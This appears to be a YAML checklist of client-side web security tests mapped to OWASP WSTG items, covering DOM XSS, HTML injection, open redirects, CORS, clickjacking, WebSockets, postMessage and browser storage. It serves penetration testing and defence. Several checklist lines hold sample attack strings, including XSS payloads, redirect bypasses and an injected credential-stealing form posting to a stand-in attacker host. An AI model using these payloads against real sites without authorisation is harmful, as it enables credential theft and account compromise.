  - id: web-test-dom-xss
    wstgId: WSTG-v42-CLNT-01
    title: Test DOM-based cross-site scripting
    category: client-side
    order: 1
    goal: Identify browser execution flows where untrusted client-side sources reach
      dangerous DOM execution sinks without sanitization.
    why: DOM XSS executes entirely on the client side, bypassing server-side input
      filters and WAFs.
    checklist:
      - "Identify client-side sources: 'location.search', 'location.hash',
        'location.href', 'document.referrer', 'window.name', 'localStorage',
        'postMessage'."
      - "Trace data flow from sources into execution sinks: 'innerHTML',
        'outerHTML', 'document.write()', 'eval()', 'setTimeout()',
        'setInterval()', 'Function()', 'script.src', 'location.assign()'."
      - Test DOM XSS payloads in URL fragments ('https://target.example/#<img
        src=x onerror=alert(1)>').
      - Test DOM-based prototype pollution where URL parameters
        ('?__proto__[key]=value') pollute global JavaScript object prototypes.
    lookFor:
      - Unsafe DOM manipulation executing script in the user's browser,
        client-side template injection (AngularJS, Vue), and prototype pollution
        reaching DOM sinks.
    tools:
      - burp-suite
      - curl
    resources:
      - wstg-clnt
      - portswigger-dom-xss
      - portswigger-prototype-pollution
      - htb-web-challenges
    findings: []
    nextSteps: []
  - id: web-test-javascript-execution
    wstgId: WSTG-v42-CLNT-02
    title: Test JavaScript execution
    category: client-side
    order: 2
    goal: Assess client-side script execution controls, sandbox boundaries, and
      subresource integrity on imported external libraries.
    why: Compromised third-party scripts or weak CSP policies allow attackers to
      execute malicious JavaScript on all client sessions.
    checklist:
      - Inspect all included external JavaScript files and CDNs for Subresource
        Integrity ('integrity="sha384-..."') attributes.
      - Evaluate Content Security Policy (CSP) headers for unsafe directives
        ('\'unsafe-inline\'', '\'unsafe-eval\'', wildcards '*', missing
        'object-src').
      - Test JavaScript sandbox escapes in in-browser code evaluation components
        and calculator utilities.
      - Check client-side JavaScript for hardcoded secrets, internal API keys,
        hidden endpoints, and debug routines.
    lookFor:
      - Missing Subresource Integrity on third-party scripts, permissive CSP
        policies allowing script injection, JavaScript sandbox bypasses, and
        hardcoded API tokens in bundled scripts.
    tools:
      - burp-suite
      - curl
    resources:
      - wstg-clnt
      - portswigger-xss
      - htb-web-challenges
    findings: []
    nextSteps: []
  - id: web-test-html-injection
    wstgId: WSTG-v42-CLNT-03
    title: Test HTML injection
    category: client-side
    order: 3
    goal: Verify that user-supplied input rendered in HTML contexts cannot alter
      page structure, deface content, or capture user credentials via injected
      forms.
    why: HTML injection allows attackers to inject phishing forms, alter application
      UI, or exploit server-side HTML/PDF renderers.
    checklist:
      - Inject harmless HTML markup ('<h1>HTML Injection Test</h1>',
        '<u>underlined</u>', '<b>bold</b>') into all reflection points.
      - Test injection of malicious forms ('<form
        action="http://attacker.example/steal"><input type="password">') to
        harvest credentials.
      - Test injection of external resource tags ('<iframe src="...">', '<img
        src="http://attacker.example/log">') to capture user IP and Referer
        data.
      - Test HTML injection inside server-rendered PDF generators to trigger
        server-side SSRF or local file inclusion.
    lookFor:
      - Rendered arbitrary HTML tags in user interfaces, phishing forms injected
        into legitimate pages, and PDF generation SSRF/LFI via HTML injection.
    tools:
      - burp-suite
      - curl
    resources:
      - wstg-clnt
      - portswigger-xss
      - htb-web-challenges
    findings: []
    nextSteps: []
  - id: web-test-client-redirect
    wstgId: WSTG-v42-CLNT-04
    title: Test client-side URL redirects
    category: client-side
    order: 4
    goal: Identify open redirect vulnerabilities in client-side routing and
      server-side redirection parameters used in phishing or OAuth token theft.
    why: Open redirects facilitate convincing phishing campaigns and can be chained
      to leak OAuth authorization codes or tokens.
    checklist:
      - Identify redirection parameters ('?return=', '?redirect=', '?next=',
        '?url=', '?target=', '?r=').
      - Test external domain redirects ('https://attacker.example',
        '//attacker.example', '/\\attacker.example', 'https:attacker.example').
      - Test bypasses for domain whitelisting
        ('https://target.example.attacker.com',
        'https://target.example@attacker.com',
        'https://attacker.com#target.example').
      - Test javascript pseudo-protocol redirects
        ('javascript:alert(document.domain)' or 'javascript:fetch(...)') leading
        to XSS.
    lookFor:
      - Unvalidated open redirects to arbitrary domains, OAuth redirect URI
        manipulation, and 'javascript:' URI execution via redirect sinks.
    tools:
      - burp-suite
      - curl
    resources:
      - wstg-clnt
      - portswigger-dom-xss
    findings: []
    nextSteps: []
  - id: web-test-cors
    wstgId: WSTG-v42-CLNT-07
    title: Test cross-origin resource sharing
    category: client-side
    order: 5
    goal: Evaluate Cross-Origin Resource Sharing (CORS) configurations to detect
      overly permissive origin trust allowing unauthorized cross-origin data
      extraction.
    why: Misconfigured CORS headers allow external malicious domains to read
      authenticated user data through victim browser requests.
    checklist:
      - "Send requests with arbitrary 'Origin' headers ('Origin:
        https://attacker.example') and inspect 'Access-Control-Allow-Origin' in
        the response."
      - "Test if the server reflects arbitrary origins alongside
        'Access-Control-Allow-Credentials: true'."
      - "Test 'Origin: null' (used in sandboxed iframes and local file origins)."
      - "Test origin substring and domain prefix/suffix trusts ('Origin:
        https://target.example.attacker.com' or 'https://not-target.example')."
    lookFor:
      - "Insecure CORS configurations reflecting 'Origin: *' or arbitrary
        origins with 'Access-Control-Allow-Credentials: true', allowing
        malicious sites to read authenticated sensitive data."
    tools:
      - curl
      - burp-suite
    resources:
      - wstg-clnt
      - portswigger-cors
    findings: []
    nextSteps: []
  - id: web-test-clickjacking
    wstgId: WSTG-v42-CLNT-09
    title: Test clickjacking
    category: client-side
    order: 6
    goal: Verify that sensitive user-facing pages cannot be framed in transparent
      iframes by attacker websites to hijack clicks.
    why: Clickjacking allows attackers to trick authenticated users into performing
      unintended actions by clicking invisible interface elements.
    checklist:
      - Inspect HTTP response headers on sensitive pages (settings, profile,
        transfer, account deletion) for 'X-Frame-Options' ('DENY' or
        'SAMEORIGIN').
      - Inspect Content Security Policy (CSP) for the 'frame-ancestors'
        directive ('frame-ancestors \'none\'' or 'frame-ancestors \'self\'').
      - Test framing the target URL inside an HTML '<iframe>' on an external
        domain to verify browser rendering behavior.
      - Test bypasses when framing sub-endpoints or login interfaces.
    lookFor:
      - Missing 'X-Frame-Options' and 'frame-ancestors' directives on
        state-changing pages, allowing UI redressing and click hijacking
        attacks.
    tools:
      - burp-suite
      - curl
    resources:
      - wstg-clnt
      - portswigger-clickjacking
    findings: []
    nextSteps: []
  - id: web-test-websockets
    wstgId: WSTG-v42-CLNT-10
    title: Test WebSockets
    category: client-side
    order: 7
    goal: Assess the security of WebSocket handshakes, authentication, cross-site
      hijacking (CSWSH), and message input validation.
    why: Unvalidated WebSocket handshakes allow cross-site connection hijacking, and
      unvalidated message payloads lead to XSS or command injection.
    checklist:
      - "Inspect the WebSocket handshake request ('Upgrade: websocket',
        'Connection: Upgrade') for authentication tokens and origin validation."
      - "Test Cross-Site WebSocket Hijacking (CSWSH) by sending handshakes with
        foreign 'Origin: https://attacker.example' and checking if cookies
        establish the connection."
      - Test input validation on WebSocket frames (injecting SQLi, XSS, command
        injection, and deserialization payloads into message JSON/text).
      - Verify WebSocket transport uses encrypted 'wss://' rather than plaintext
        'ws://'.
    lookFor:
      - Unvalidated 'Origin' in WebSocket handshake allowing unauthorized
        cross-site connection hijacking, injection vulnerabilities in message
        handlers, and plaintext 'ws://' traffic.
    tools:
      - burp-suite
      - curl
    resources:
      - wstg-clnt
      - portswigger-websockets
      - htb-web-challenges
    findings: []
    nextSteps: []
  - id: web-test-web-messaging
    wstgId: WSTG-v42-CLNT-11
    title: Test web messaging
    category: client-side
    order: 8
    goal: Evaluate window.postMessage() event listeners for target origin
      validation, message sender verification, and unsafe payload processing.
    why: Insecure postMessage handlers allow malicious iframes or popups to trigger
      DOM XSS or extract sensitive client state.
    checklist:
      - Search JavaScript source code for 'addEventListener("message", ...)'
        message listeners.
      - Verify whether message handlers validate 'event.origin' against an
        explicit domain allowlist before processing message data.
      - Trace 'event.data' into DOM sinks ('innerHTML', 'eval()',
        'location.href') within the message handler.
      - Test sending cross-window messages ('targetWindow.postMessage(payload,
        "*")') from an attacker iframe.
    lookFor:
      - Message event listeners lacking 'event.origin' validation, wildcard
        target origins ('*') transmitting sensitive tokens, and DOM XSS
        triggered via unvalidated message data.
    tools:
      - burp-suite
      - curl
    resources:
      - wstg-clnt
      - portswigger-dom-xss
    findings: []
    nextSteps: []
  - id: web-test-browser-storage
    wstgId: WSTG-v42-CLNT-12
    title: Test browser storage
    category: client-side
    order: 9
    goal: Assess client-side storage mechanisms (localStorage, sessionStorage,
      IndexedDB, Web SQL) for unencrypted sensitive data, JWTs, or session
      credentials.
    why: Sensitive data in browser storage is accessible to any script executing on
      the origin and persists across tabs and sessions.
    checklist:
      - Inspect browser Developer Tools storage tabs across authenticated
        workflows for stored tokens, credentials, PII, and API keys.
      - Test whether session authentication tokens stored in 'localStorage' are
        accessible to XSS attacks (unlike 'HttpOnly' cookies).
      - Check for sensitive cached state or cryptographic keys stored
        permanently in 'localStorage' or 'IndexedDB'.
      - Verify that browser storage is cleared completely upon user logout.
    lookFor:
      - Long-term storage of authentication tokens in 'localStorage',
        unencrypted PII/credentials in client storage, and uncleared storage
        after session termination.
    tools:
      - burp-suite
      - curl
    resources:
      - wstg-clnt
      - owasp-cheatsheet-session
      - htb-web-challenges
    findings: []
    nextSteps: []
